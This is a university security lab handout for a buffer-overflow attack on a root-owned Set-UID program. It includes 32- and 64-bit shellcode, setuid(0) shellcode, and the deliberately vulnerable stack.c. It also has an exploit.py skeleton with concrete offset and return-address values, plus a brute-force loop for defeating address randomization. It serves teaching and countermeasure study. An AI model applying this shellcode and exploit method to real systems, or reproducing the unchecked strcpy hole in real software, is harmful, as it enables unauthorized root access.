# Buffer Overflow Attack Lab (Set-UID Version)

Copyright © 2006 - 2020 by Wenliang Du.<br>
This work is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License. If you remix, transform, or build upon the material, this copyright notice must be left intact, or reproduced in a way that is reasonable to the medium in which the work is being re-published.

## 1 Overview

Buffer overflow is defined as the condition in which a program attempts to write data beyond the boundary of a buffer. This vulnerability can be used by a malicious user to alter the flow control of the program, leading to the execution of malicious code. The objective of this lab is for students to gain practical insights into this type of vulnerability and learn how to exploit the vulnerability in attacks. 

In this lab, students will be given a program with a buffer-overflow vulnerability; their task is to develop a scheme to exploit the vulnerability and finally gain the root privilege. In addition to the attacks, students will be guided to walk through several protection schemes that have been implemented in the operating system to counter against buffer-overflow attacks. Students need to evaluate whether the schemes work or not and explain why. This lab covers the following topics: 

- Buffer overflow vulnerability and attack
- Stack layout
- Address randomization, non-executable stack, and StackGuard
- Shellcode (32-bit and 64-bit)
- The return-to-libc attack, which aims at defeating the non-executable stack countermeasure, is covered
    in a separate lab.

**Readings and videos**. Detailed coverage of the buffer-overflow attack can be found in the following:

- Chapter 4 of the SEED Book,Computer & Internet Security: A Hands-on Approach, 2nd Edition, by Wenliang Du. See details at https://www.handsonsecurity.net.
- Section 4 of the SEED Lecture at Udemy,Computer Security: A Hands-on Approach, by WenliangDu. See details at https://www.handsonsecurity.net/video.html.

**Lab environment**.You can perform the lab exercise on the SEED VM provided by the Cloudlabs.

First we need to make sure that we are logged in to **seed** user. Type the below commmands to log in as seed user and change directory.

```bash
sudo su seed
cd
```
![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/6252c5b5-7bd6-4fd7-b995-4dc0d7cbd62c)


Files needed for this lab are included in Labsetup.zip, which can be fetched by running the following commands.


```bash
wget https://github.com/CloudLabs-MOC/CloudLabs-SEED/raw/main/Software%20Security/Buffer%20Overflow%20Attack/Buffer%20Overflow%20Setuid/Lab%20files/Labsetup.zip
```
![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/b7f8bc2c-4bf3-46d7-9192-b5c036c5af70)
```bash
unzip Labsetup.zip
```
![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/fbe4890d-16ac-4abe-8ef0-deb842d923f4)

**Note for instructors**. Instructors can customize this lab by choosing values for L1, ..., L4. See Section 4 for details. Depending on the background of students and the time allocated for this lab, instructors can also make the Level-2, Level-3, and Level-4 tasks (or some of them) optional. The Level-1 task is sufficient to cover the basics of the buffer-overflow attacks. Levels 2 to 4 increase the attack difficulties. All the countermeasure tasks are based on the Level-1 task, so skipping the other levels does not affect those tasks. 


## 2 Environment Setup

### 2.1 Turning Off Countermeasures

Modern operating systems have implemented several security mechanisms to make the buffer-overflow attack difficult. To simplify our attacks, we need to disable them first. Later on, we will enable them and see whether our attack can still be successful or not. 

**Address Space Randomization**. Ubuntu and several other Linux-based systems uses address space randomization to randomize the starting address of heap and stack. This makes guessing the exact addresses difficult; guessing addresses is one of the critical steps of buffer-overflow attacks. This feature can be disabled using the following command: 

```bash
sudo sysctl -w kernel.randomize_va_space=0
```
![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/facfa7fd-4d17-421f-8bc3-10bbb903b263)

 **Configuring /bin/sh**. In the recent versions of Ubuntu OS, the /bin/sh symbolic link points to the `/bin/dash` shell. The dash program, as well as bash, has implemented a security countermeasure that prevents itself from being executed in a Set-UID process. Basically, if they detect that they are executed in a Set-UID process, they will immediately change the effective user ID to the process’s real user ID, essentially dropping the privilege.
 
Since our victim program is a Set-UID program, and our attack relies on running `/bin/sh`, the countermeasure in `/bin/dash` makes our attack more difficult. Therefore, we will link `/bin/sh` to another shell that does not have such a countermeasure (in later tasks, we will show that with a little bit more effort, the countermeasure in `/bin/dash` can be easily defeated). We have installed a shell program called `zsh` in our Ubuntu 20.04 VM. The following command can be used to link `/bin/sh` to `zsh`: 

```bash
sudo ln -sf /bin/zsh /bin/sh
```
or we can type `-v` to see what is happening behind.
```bash
sudo ln -sf /bin/zsh /bin/sh -v
```

![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/9f20070f-2150-42bd-ab90-b9f54e18d374)

**StackGuard and Non-Executable Stack**. These are two additional countermeasures implemented in the system. They can be turned off during the compilation. We will discuss them later when we compile the vulnerable program. 

## 3 Task 1: Getting Familiar with Shellcode

The ultimate goal of buffer-overflow attacks is to inject malicious code into the target program, so the code can be executed using the target program’s privilege. Shellcode is widely used in most code-injection attacks. Let us get familiar with it in this task. 

### 3.1 The C Version of Shellcode

First we redirect to the lab files with the help of following commands:

```bash
ls
cd Labsetup/
ls
```

> Here Labsetup is the folder name which you download and unzipped in previous steps.

![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/d1425f16-6a4d-4672-8620-60aba8b6ad4b)

A shellcode is basically a piece of code that launches a shell. If we use C code to implement it, it will look like the following: 

```c
#include <stdio.h>

int main() {
    char *name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL);
}
```

Unfortunately, we cannot just compile this code and use the binary code as our shellcode (detailed explanation is provided in the SEED book). The best way to write a shellcode is to use assembly code. In this lab, we only provide the binary version of a shellcode, without explaining how it works (it is non-trivial). If you are interested in how exactly shellcode works and you want to write a shellcode from scratch, you can learn that from a separate SEED lab called Shellcode Lab. 

### 3.2 32-bit Shellcode

```bash
; Store the command on stack
xor eax, eax
push eax
push "//sh"
push "/bin"
mov ebx, esp ; ebx --> "/bin//sh": execve()’s 1st argument
; Construct the argument array argv[]
push eax ; argv[1] = 0
push ebx ; argv[0] --> "/bin//sh"
mov ecx, esp ; ecx --> argv[]: execve()’s 2nd argument
; For environment variable
xor edx, edx ; edx = 0: execve()’s 3rd argument
; Invoke execve()
xor eax, eax ;
mov al, 0x0b ; execve()’s system call number
int 0x80
```

The shellcode above basically invokes the execve() system call to execute `/bin/sh`. In a separate SEED lab, the Shellcode lab, we guide students to write shellcode from scratch. Here we only give a very brief explanation. 

- The third instruction pushes "//sh", rather than "/sh" into the stack. This is because we need a 32-bit number here, and "/sh" has only 24 bits. Fortunately, "//" is equivalent to "/", so we can get away with a double slash symbol. 
- We need to pass three arguments to `execve()` via the `ebx, ecx and edx` registers, respectively. The majority of the shellcode basically constructs the content for these three arguments. 
- The system call execve() is called when we set al to 0x0b, and execute "int 0x80". 

### 3.3 64-Bit Shellcode

We provide a sample 64-bit shellcode in the following. It is quite similar to the 32-bit shellcode, except that the names of the registers are different and the registers used by the execve() system call are also different. Some explanation of the code is given in the comment section, and we will not provide detailed explanation on the shellcode 

```bash
xor rdx, rdx ; rdx = 0: execve()’s 3rd argument
push rdx
mov rax, ’/bin//sh’ ; the command we want to run
push rax ;
mov rdi, rsp ; rdi --> "/bin//sh": execve()’s 1st argument
push rdx ; argv[1] = 0
push rdi ; argv[0] --> "/bin//sh"
mov rsi, rsp ; rsi --> argv[]: execve()’s 2nd argument
xor rax, rax
mov al, 0x3b ; execve()’s system call number
syscall
```

### 3.4 Task: Invoking the Shellcode

We have generated the binary code from the assembly code above, and put the code in a C program called call_shellcode.c inside the shellcode folder. If you would like to learn how to generate the binary code yourself, you should work on the Shellcode lab. In this task, we will test the shellcode. 

Redirect to shellcode and open the **call_shellcode.c**

```bash
cd shellcode/
cat call_shellcode.c
```
![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/17703a08-8b32-41ba-a704-ed0575b248e4)

Listing 1 : **callshellcode.c**

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char shellcode[] =
#if __x86_64__
"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
"\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
"\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
"\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;

int main(int argc, char **argv)
{
char code[500];

strcpy(code, shellcode); // Copy the shellcode to the stack
int (*func)() = (int(*)())code;
func(); // Invoke the shellcode from the stack
return 1;
}
```

The code above includes two copies of shellcode, one is 32-bit and the other is 64-bit. When we compile the program using the `-m32` flag, the 32-bit version will be used; without this flag, the 64-bit version will be used. Using the provided Makefile, you can compile the code by typing make. Two binaries will be created, `a32.out` (32-bit) and `a64.out` (64-bit). Run them and describe your observations. It should be noted that the compilation uses the `execstack` option, which allows code to be executed from the stack; without this option, the program will fail. 

## 4 Task 2: Understanding the Vulnerable Program

The vulnerable program used in this lab is called stack.c, which is in the code folder. This program has a buffer-overflow vulnerability, and your job is to exploit this vulnerability and gain the root privilege. The code listed below has some non-essential information removed, so it is slightly different from what you get from the lab setup file. 

We have to change the file location since the **stack.c** file is present in "code" folder. To do that type (make sure you are in /Labsetup/shellcode directory):

```bash
cd ..
cd code/
ls
```
![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/78315387-ca4b-4e04-9d1d-65dd834a436f)

type `cat stack.c` to view the file content.

Listing 2: The vulnerable program **stack.c**

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Changing this size will change the layout of the stack.
* Instructors can change this value each year, so students
* won’t be able to use the solutions from the past. */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

int bof(char *str)
{
    char buffer[BUF_SIZE];

    /* The following statement has a buffer overflow problem */
    strcpy(buffer, str);
    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
```

The above program has a buffer overflow vulnerability. It first reads an input from a file called _badfile_, and then passes this input to another buffer in the function bof(). The original input can have a maximum length of _517_ bytes, but the buffer in _bof()_ is only _BUF_SIZE_ bytes long, which is less than 517. Because _strcpy()_ does not check boundaries, buffer overflow will occur. Since this program is a root-owned Set-UID program, if a normal user can exploit this buffer overflow vulnerability, the user might be able to get a root shell. It should be noted that the program gets its input from a file called _badfile_. This file is under users’ control. Now, our objective is to create the contents for badfile, such that when the vulnerable program copies the contents into its buffer, a root shell can be spawned 

**Compilation**. To compile the above vulnerable program, do not forget to turn off the StackGuard and the non-executable stack protections using the _-fno-stack-protector_ and "-z execstack" options. After the compilation, we need to make the program a root-owned Set-UID program. We can achieve this by first change the ownership of the program to root (Line ➀), and then change the permission to 4755 to enable the Set-UID bit (Line ➁). It should be noted that changing ownership must be done before turning on the Set-UID bit, because ownership change will cause the Set-UID bit to be turned off. 

> No need to type these commands as the `Makefile` has already included these commands

gcc -DBUF_SIZE=100 -m32 -o stack -z execstack -fno-stack-protector stack.c 

sudo chown root stack ➀  

sudo chmod 4755 stack ➁ 

To run the **Makefile**, simply type:

```bash
make
ls
```
![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/9ab968b8-d417-4595-ae0e-1f79ac168bba)

The compilation and setup commands are already included in _Makefile_, so we just need to type make to execute those commands. The variables _L1, ..., L4_ are set in _Makefile_; they will be used during the compilation. If the instructor has chosen a different set of values for these variables, you need to change them in Makefile. 

**For instructors (customization)**. To make the lab slightly different from the one offered in the past, instructors can change the value for _BUF_SIZE_ by requiring students to compile the server code using different _BUF_SIZE_ values. In I, the _BUF_SIZE_ value is set by four variables _L1, ..., L4_. Instructors should pick the values for these variables based on the following suggestions: 

- L1: pick a number between 100 and 400
- L2: pick a number between 100 and 200
- L3: pick a number between 100 and 400
- L4: we need to keep this number smaller, to make this level more challenging than the previous level.Since there are not many choices, we will fix this number at 10.

## 5 Task 3: Launching Attack on 32-bit Program (Level 1)

### 5.1 Investigation

To exploit the buffer-overflow vulnerability in the target program, the most important thing to know is the distance between the buffer’s starting position and the place where the return-address is stored. We will use a debugging method to find it out. Since we have the source code of the target program, we can compile it with the debugging flag turned on. That will make it more convenient to debug. 

We will add the _-g_ flag to _gcc_ command, so debugging information is added to the binary. If you run _make_, the debugging version is already created. We will use _gdb_ to debug _stack-L1-dbg_. We need to create a file called badfile before running the program. 

Type the following command to Investigate.

```
ls
touch badfile
gdb stack-L1-dbg
```

> Make sure your current working directry is "/Labsetup/code" and it has the following files :

![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/19918c34-34b4-40db-819f-72ad3fb7d7cb)

```
b bof
```
```
run
```
```
next
```
![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/db2ecd92-6d1b-4163-b7b6-27d406020512)

```
p $ebp
```
> Please note down the `$ebp` value ie. 0xffffcfa8 _(This value might change over time)._
```
p &buffer
quit
```
![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/89f7f694-38e8-4919-b7c0-8b5d4ccb269b)

**Note 1**. When gdb stops inside the _bof()_ function, it stops before the _ebp_ register is set to point to the current stack frame, so if we print out the value of ebp here, we will get the caller’s _ebp_ value. We need to use next to execute a few instructions and stop after the ebp register is modified to point to the stack frame of the _bof()_ function. The SEED book is based on Ubuntu 16.04, and gdb’s behavior is slightly different, so the book does not have the next step 

Note 2. It should be noted that the frame pointer value obtained from gdb is different from that during the actual execution (without using _gdb_). This is because gdb has pushed some environment data into the stack before running the debugged program. When the program runs directly without using gdb, the stack does not have those data, so the actual frame pointer value will be larger. You should keep this in mind when constructing your payload. 

### 5.2 Launching Attacks

To exploit the buffer-overflow vulnerability in the target program, we need to prepare a payload, and save it inside _badfile_. We will use a Python program to do that. We provide a skeleton program called _exploit.py_, which is included in the lab setup file. The code is `incomplete`, and students need to `replace some of the essential values` in the code. 

Listing 3: **exploit.py**

```python
#!/usr/bin/python
import sys

shellcode= (
    "\x90\x90\x90\x90"  
    "\x90\x90\x90\x90"
).encode(’latin-1’)

# Fill the content with NOP’s
content = bytearray(0x90 for i in range(517))

##################################################################
# Put the shellcode somewhere in the payload
start = 0                                    #Need to change
content[start:start + len(shellcode)] = shellcode

# Decide the return address value
# and put it somewhere in the payload
ret = 0x00                                   #Need to change
offset = 0                                   #Need to change

L = 4 # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder=’little’)
##################################################################

# Write the content to a file
with open(’badfile’, ’wb’) as f:
f.write(content)
```

Open the file using `nano exploit.py`

Change the following values:

| Param | Value |
| ----------- | ----------- |
| start | 400 |
| ret | 0xffffcfa8 + 100 _(something more than `$ebp` value which you copied in previous task)_ |
| offset | 132 |

After you finish the above program, run it. This will generate the contents for _badfile_. Then run the vulnerable program _stack_. If your exploit is implemented correctly, you should be able to get a root shell: 

```bash
./exploit.py 
./stack-L1

# <---- Bingo! You’ve got a root shell!
```

![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/cafdeb3a-cc7b-4a8e-b9df-aaae70d819f0)

> If faced the issue, Please add more in the ret value. Instead of `0xffffcfa8 + 100` try `0xffffcfa8 + 200`.

![image](https://github.com/CloudLabs-MOC/CloudLabs-SEED/assets/33658792/1afabe86-1b6b-44c7-ad44-790a73b11b7c)

In your lab report, in addition to providing screenshots to demonstrate your investigation and attack, you also need to explain how the values used in your _exploit.py_ are decided. These values are the most important part of the attack, so a detailed explanation can help the instructor grade your report. Only demonstrating a successful attack without explaining why the attack works will not receive many points. 

## 6 Task 4: Launching Attack without Knowing Buffer Size (Level 2)

In the Level-1 attack, using _gdb_, we get to know the size of the buffer. In the real world, this piece of information may be hard to get. For example, if the target is a server program running on a remote machine, we will not be able to get a copy of the binary or source code. In this task, we are going to add a constraint: you can still use _gdb_, but you are not allowed to derive the buffer size from your investigation. Actually, the buffer size is provided in _Makefile_, but you are not allowed to use that information in your attack 

Your task is to get the vulnerable program to run your shellcode under this constraint. We assume that you do know the range of the buffer size, which is from 100 to 200 bytes. Another fact that may be useful to you is that, due to the memory alignment, the value stored in the frame pointer is always multiple of four (for 32-bit programs). 

Please be noted, you are only allowed to construct one payload that works for any buffer size within this range. You will not get all the credits if you use the brute-force method, i.e., trying one buffer size each time. The more you try, the easier it will be detected and defeated by the victim. That’s why minimizing the number of trials is important for attacks. In your lab report, you need to describe your method, and provide evidences. 

## 7 Task 5: Launching Attack on 64-bit Program (Level 3)

In this task, we will compile the vulnerable program into a 64-bit binary called _stack-L3_. We will launch attacks on this program. The compilation and setup commands are already included in _Makefile_. Similar to the previous task, detailed explanation of your attack needs to be provided in the lab report. 

Using _gdb_ to conduct an investigation on 64-bit programs is the same as that on 32-bit programs. The only difference is the name of the register for the frame pointer. In the x86 architecture, the frame pointer is _ebp_, while in the x64 architecture, it is _rbp_. 

**Challenges**. Compared to buffer-overflow attacks on 32-bit machines, attacks on 64-bit machines is more difficult. The most difficult part is the address. Although the x64 architecture supports 64-bit address space, only the address from _0x00_ through _0x00007FFFFFFFFFFF_ is allowed. That means for every address (8 bytes), the highest two bytes are always zeros. This causes a problem. 

In our buffer-overflow attacks, we need to store at least one address in the payload, and the payload will be copied into the stack via _strcpy()_. We know that the _strcpy()_ function will stop copying when it sees a zero. Therefore, if zero appears in the middle of the payload, the content after the zero cannot be copied into the stack. How to solve this problem is the most difficult challenge in this attack. 

## 8 Task 6: Launching Attack on 64-bit Program (Level 4)

The target program _(stack-L4)_ in this task is similar to the one in the Level 2, except that the buffer size is extremely small. We set the buffer size to 10, while in Level 2, the buffer size is much larger. Your goal is the same: get the root shell by attacking this _Set-UID_ program. You may encounter additional challenges in this attack due to the small buffer size. If that is the case, you need to explain how your have solved those challenges in your attack .

## 9 Tasks 7: Defeating dash ’s Countermeasure

The dash shell in the Ubuntu OS drops privileges when it detects that the effective UID does not equal to the real UID (which is the case in a Set-UID program). This is achieved by changing the effective UID back to the real UID, essentially, dropping the privilege. In the previous tasks, we let _/bin/sh_ points to another shell called _zsh_, which does not have such a countermeasure. In this task, we will change it back, and see how we can defeat the countermeasure. Please do the following, so _/bin/sh_ points back to /bin/dash. 

```
$ sudo ln -sf /bin/dash /bin/sh
```

To defeat the countermeasure in buffer-overflow attacks, all we need to do is to change the real UID, so it equals the effective UID. When a root-owned Set-UID program runs, the effective UID is zero, so before we invoke the shell program, we just need to change the real UID to zero. We can achieve this by invoking _setuid(0)_ before executing _execve()_ in the shellcode 

The following assembly code shows how to invoke _setuid(0)_. The binary code is already put inside call shellcode.c. You just need to add it to the beginning of the shellcode. 

```
; Invoke setuid(0): 32-bit
xor ebx, ebx ; ebx = 0: setuid()’s argument
xor eax, eax
mov al, 0xd5 ; setuid()’s system call number
int 0x

; Invoke setuid(0): 64-bit
xor rdi, rdi ; rdi = 0: setuid()’s argument
xor rax, rax
mov al, 0x69 ; setuid()’s system call number
syscall
```

**Experiment**. Compile call shellcode.c into root-owned binary (by typing "make setuid"). Run the shellcode _a32.out_ and _a64.out_ with or without the _setuid(0)_ system call. Please describe and explain your observations. 

**Launching the attack again**.Now, using the updated shellcode, we can attempt the attack again on the vulnerable program, and this time, with the shell’s countermeasure turned on. Repeat your attack on Level 1, and see whether you can get the root shell. After getting the root shell, please run the following command to prove that the countermeasure is turned on. Although repeating the attacks on Levels 2 and 3 are not required, feel free to do that and see whether they work or not. 

```
# ls -l /bin/sh /bin/zsh /bin/dash
```

## 10 Task 8: Defeating Address Randomization

On 32-bit Linux machines, stacks only have 19 bits of entropy, which means the stack base address can have 2^19 = 524, 288 possibilities. This number is not that high and can be exhausted easily with the brute-force approach. In this task, we use such an approach to defeat the address randomization countermeasure on our 32-bit VM. First, we turn on the Ubuntu’s address randomization using the following command. Then we run the same attack against _stack-L1_. Please describe and explain your observation 

```
$ sudo /sbin/sysctl -w kernel.randomize_va_space=2
```

We then use the brute-force approach to attack the vulnerable program repeatedly, hoping that the address we put in the _badfile_ can eventually be correct. We will only try this on _stack-L1_, which is a 32-bit program. You can use the following shell script to run the vulnerable program in an infinite loop. If your attack succeeds, the script will stop; otherwise, it will keep running. Please be patient, as this may take a few minutes, but if you are very unlucky, it may take longer. Please describe your observation. 

```
#!/bin/bash

SECONDS=
value=

while true; do
value=$(( $value + 1 ))
duration=$SECONDS
min=$(($duration / 60))
sec=$(($duration % 60))
echo "$min minutes and $sec seconds elapsed."
echo "The program has been running $value times so far."
./stack-L
done
```

Brute-force attacks on 64-bit programs is much harder, because the entropy is much larger. Although this is not required, free free to try it just for fun. Let it run overnight. Who knows, you may be very lucky. 

## 11 Tasks 9: Experimenting with Other Countermeasures

### 11.1 Task 9.a: Turn on the StackGuard Protection

Many compiler, such as gcc, implements a security mechanism called StackGuard to prevent buffer overflows. In the presence of this protection, buffer overflow attacks will not work. In our previous tasks, we disabled the StackGuard protection mechanism when compiling the programs. In this task, we will turn it on and see what will happen. 

First, repeat the Level-1 attack with the StackGuard off, and make sure that the attack is still successful. Remember to turn off the address randomization, because you have turned it on in the previous task. Then, we turn on the StackGuard protection by recompiling the vulnerable _stack.c_ program without the _-fno-stack-protector flag_. In _gcc_ version 4.3.3 and above, StackGuard is enabled by default. Launch the attack; report and explain your observations. 

### 11.2 Task 9.b: Turn on the Non-executable Stack Protection

Operating systems used to allow executable stacks, but this has now changed: In Ubuntu OS, the binary images of programs (and shared libraries) must declare whether they require executable stacks or not, i.e., they need to mark a field in the program header. Kernel or dynamic linker uses this marking to decide whether to make the stack of this running program executable or non-executable. This marking is done automatically by the gcc, which by default makes stack non-executable. We can specifically make it nonexecutable using the "_-z noexecstack_" flag in the compilation. In our previous tasks, we used "_-z execstack_" to make stacks executable. 

In this task, we will make the stack non-executable. We will do this experiment in the shellcode folder. The call shellcode program puts a copy of shellcode on the stack, and then executes the code from the stack. Please recompile call _shellcode.c_ into _a32.out_ and _a64.out_, without the "_-z execstack_" option. Run them, describe and explain your observations. 

**Defeating the non-executable stack countermeasure**. It should be noted that non-executable stack only makes it impossible to run shellcode on the stack, but it does not prevent buffer-overflow attacks, because there are other ways to run malicious code after exploiting a buffer-overflow vulnerability. The return-to-libc attack is an example. We have designed a separate lab for that attack. If you are interested, please see our Return-to-Libc Attack Lab for details. 

## 12 Submission

You need to submit a detailed lab report, with screenshots, to describe what you have done and what you have observed. You also need to provide explanation to the observations that are interesting or surprising. Please also list the important code snippets followed by explanation. Simply attaching code without any explanation will not receive credits. 


